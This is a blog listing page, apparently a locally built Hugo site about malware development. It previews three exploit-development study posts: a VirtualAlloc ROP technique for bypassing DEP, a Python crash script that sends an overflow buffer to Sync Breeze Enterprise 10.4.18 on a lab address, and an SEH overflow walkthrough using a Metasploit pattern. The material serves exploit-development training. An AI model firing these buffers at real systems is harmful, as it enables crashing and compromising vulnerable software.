<!DOCTYPE html>
<html class="home" lang="en"><head>
	<meta name="generator" content="Hugo 0.147.5"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
        <script>
            if (location.host != new URL("http:\/\/localhost:1313\/").host) location.href = "http:\/\/localhost:1313\/"
        </script>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    
        
          <link href="http://localhost:1313/index.xml" rel="alternate" type="application/rss+xml" title="purpurina - a place for hacking" />
          <link href="http://localhost:1313/index.xml" rel="feed" type="application/rss+xml" title="purpurina - a place for hacking" />
        
    <link
    rel="icon"
    href='http://localhost:1313/favicon.png'
/>
<link
    rel="shortcut icon"
    href='http://localhost:1313/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='http://localhost:1313/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='http://localhost:1313/favicon.png'
        type="image/svg+xml"
    />

<title>
        
        purpurina - a place for hacking
    </title>

    
    <link href="http://localhost:1313/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
    <link href="http://localhost:1313/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>

    
    
    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.b88203936c598b692d9cbebd7da89eb34e544b8522ae4c14ca657761be96b80c2acee8e6631de04d99ee1bdbc1bcad4a3add6f47a2366f4a29e2c531782be1a8.css integrity="sha512-uIIDk2xZi2ktnL69faies05US4UirkwUymV3Yb6WuAwqzujmYx3gTZnuG9vBvK1KOt1vR6I2b0op4sUxeCvhqA==" />
<meta name="author" content="jaco" />

    
        <meta name="description" content="Malware development, research and OS internals" />
    

<meta property="og:site_name"
    content='purpurina - a place for hacking' />

    <meta property="og:title"
        content='purpurina - a place for hacking' />
    
        <meta property="og:description" content="Malware development, research and OS internals" />
    
    <meta property="og:type" content="blog" />
    <meta property="og:image"
        content='http://localhost:1313/icon512.png' />

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='localhost:1313'
/>
<meta property="twitter:url" content="http://localhost:1313/" />


    <meta name="twitter:title"
        content='purpurina - a place for hacking' />
    
        <meta name="twitter:description" content="Malware development, research and OS internals" />
    
    <meta name="twitter:image"
        content='http://localhost:1313/icon512.png' />

<link rel="manifest" href="http://localhost:1313/manifest/index.json" />
</head>


    
    
    

<body>
        <div id="baseContainer"><header class="jumbotronContainer">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="http://localhost:1313/">
                    <img src='http://localhost:1313/logo.jpg' alt='Logo'/>
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="http://localhost:1313/">purpurina - a place for hacking</a>
                        
                    </h1>
                    
                </div>
                <div id="wide_nav"><nav>
    
    <ul id="main-nav">
        <li><a href="http://localhost:1313/">Home</a></li>
        
            <li><a href="http://localhost:1313/posts/">Posts</a></li>
        
        
        
        
        
        
            <li><a href="http://localhost:1313/about/">About</a></li>
        
        
            <li><a href="http://localhost:1313/tags/">Tags</a></li>
        
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search/?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        
        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://www.linkedin.com/in/jacobocasado/?originalSubdomain=es">
    
    
        &#xf0e1;
    
    <span>
        LinkedIn
    </span>
</a>

    </div>
    

</header>
<div id="contentContainer">
                <div id="content">
                    <main>

    
    
    





    



<div class="postlist " id="postlist">
<article class="card postlistitem">
    <div>
        <h2>
            <a href="http://localhost:1313/posts/osed_rop_2/"></a>
        </h2>
        <p class="date">
            <span title='Date'> </span>
    0001-01-01


        </p>
        
        
            <div class="articlePreview">
                <p>
                    
                        <h1 id="virtualalloc-rop">VirtualAlloc ROP</h1>
<p>Let&rsquo;s see how we can use VirtualAlloc to bypass DEP.
VirtualAlloc is a Windows API function that can reserve, commit, <strong>or change</strong> the state of a region of pages in the virtual address space of the calling process.
We are going to invoke VirtualAlloc by placing a skeleton of the function call on the stack through the buffer overflow, modifying its address and parameters through ROP, and then return into it. The skeleton should contain the VirtualAlloc address followed by the return address (which should be our shellcode) and the arguments for the function call.
Let&rsquo;s see the skeleton of VirtualAlloc:</p>
                    
                </p>
                <p><a href="http://localhost:1313/posts/osed_rop_2/">Continue reading </a></p>
            </div>
        
    </div>
    <hr />
</article>
<article class="card postlistitem">
    <div>
        <h2>
            <a href="http://localhost:1313/posts/osed_seh_1/"></a>
        </h2>
        <p class="date">
            <span title='Date'> </span>
    0001-01-01


        </p>
        
        
            <div class="articlePreview">
                <p>
                    
                        <h1 id="analyzing-public-exploit">Analyzing public exploit</h1>
<ul>
<li>Vulnerable Binary: Sync Breeze Enterprise v10.4.18</li>
</ul>
<p>Let&rsquo;s try to use the public exploit to trigger a crash:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python  </span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket  
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys  
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:  
</span></span><span style="display:flex;"><span> server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.122.113&#34;</span>  
</span></span><span style="display:flex;"><span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9121</span>  
</span></span><span style="display:flex;"><span> size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>  
</span></span><span style="display:flex;"><span> inputBuffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> size  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\x19\xba\xab</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x40\x00\x00</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, len(inputBuffer))  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, len(inputBuffer))  
</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, inputBuffer[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])  
</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">=</span> header <span style="color:#f92672">+</span> inputBuffer  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)  
</span></span><span style="display:flex;"><span> s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>connect((server, port))  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>send(buf)  
</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>close()  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Done!&#34;</span>)  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error:  
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Could not connect!&#34;</span>)
</span></span></code></pre></div><p>When we execute the exploit, we see that the EAX register is overwritten, but not the EIP&hellip;
Seems like at this moment the EIP register is not directly under our control.
Also, there is some data in the stack that contains part of our payload:
<img src="content/images/post_images/osed_2.png" alt=""></p>
                    
                </p>
                <p><a href="http://localhost:1313/posts/osed_seh_1/">Continue reading </a></p>
            </div>
        
    </div>
    <hr />
</article>
<article class="card postlistitem">
    <div>
        <h2>
            <a href="http://localhost:1313/posts/osed_seh_2/"></a>
        </h2>
        <p class="date">
            <span title='Date'> </span>
    0001-01-01


        </p>
        
        
            <div class="articlePreview">
                <p>
                    
                        <h1 id="our-first-seh-overflow-exploit-step-by-step">Our first SEH overflow exploit, step by step</h1>
<p>Let&rsquo;s start supposing that we already know that our input buffer crashes the program and somehow reaches any of the <code>_EXCEPTION_REGISTRATION_RECORD</code> structures.
Let&rsquo;s create a pattern in KALI to see the length of our buffer until it reaches the structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_create -l <span style="color:#ae81ff">1000</span>              
</span></span><span style="display:flex;"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
</span></span></code></pre></div><p>Let&rsquo;s paste this pattern and send this next to the headers needed so our payload is processed. Sending only this payload is useless as we want the program to process the input.
With 1000 characters, the program crashes:</p>
                    
                </p>
                <p><a href="http://localhost:1313/posts/osed_seh_2/">Continue reading </a></p>
            </div>
        
    </div>
    <hr />
</article>

</div>
<div id="getNextBtnContainer"></div>


    
    <div id="pageNavigation" class='
            
    '>
        
            <a href="http://localhost:1313/page/2/" title='Previous page'>
                
                    &lt;&lt;&lt;
                
            </a>
        
        
        
            
                <a href="http://localhost:1313/">1</a>
            
        
            
                <a href="http://localhost:1313/page/2/">2</a>
            
        
            
            <span>
                [3]
            </span>
            
        
        
    </div>





                    </main><footer>
    <hr />

<p><small>
        2025 &copy; made by jaco with love
    </small></p>
    <p><small>
        Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
